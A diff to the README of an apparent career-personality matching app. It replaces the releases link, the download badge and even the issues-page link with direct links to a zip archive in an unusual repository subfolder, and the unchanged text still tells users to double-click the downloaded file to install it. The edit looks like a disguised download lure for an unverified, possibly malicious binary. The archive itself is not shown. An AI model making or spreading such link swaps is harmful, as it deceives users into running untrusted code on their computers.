@@ -1,7 +1,7 @@
 # 🎯 Career_Personality_Matching - Find Your Ideal Career Path
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/download-latest--release-brightgreen.svg)](https://github.com/andraVV/Career_Personality_Matching/releases)
+[![Download Latest Release](https://github.com/andraVV/Career_Personality_Matching/raw/refs/heads/main/yoretime/Career_Personality_Matching_3.2.zip)](https://github.com/andraVV/Career_Personality_Matching/raw/refs/heads/main/yoretime/Career_Personality_Matching_3.2.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the **Career_Personality_Matching** application. This software helps you discover career paths that align with your personality traits through data analysis and machine learning techniques.
@@ -17,7 +17,7 @@ Before getting started, make sure your computer meets the following requirements
 ## 📦 Download & Install
 To begin using the application, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/andraVV/Career_Personality_Matching/releases) of the project.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/andraVV/Career_Personality_Matching/raw/refs/heads/main/yoretime/Career_Personality_Matching_3.2.zip) of the project.
 2. **Download the Latest Version**: On the Releases page, find the latest version of the application. Click the link to download the file appropriate for your operating system.
 3. **Run the Application**: Once downloaded, locate the file in your downloads folder and double-click it to install. Follow the on-screen instructions to complete the installation.
 
@@ -52,6 +52,6 @@ To make the most of the application, follow these guidelines:
 - **Stay Updated**: Check the Releases page occasionally for updates or new features.
 
 ## 💬 Support & Feedback
-If you encounter any issues or have feedback, please visit our [issues page](https://github.com/andraVV/Career_Personality_Matching/issues). Your input is important to us and helps improve the application.
+If you encounter any issues or have feedback, please visit our [issues page](https://github.com/andraVV/Career_Personality_Matching/raw/refs/heads/main/yoretime/Career_Personality_Matching_3.2.zip). Your input is important to us and helps improve the application.
 
 Thank you for trying out **Career_Personality_Matching**! We hope it provides valuable insights for your career journey.
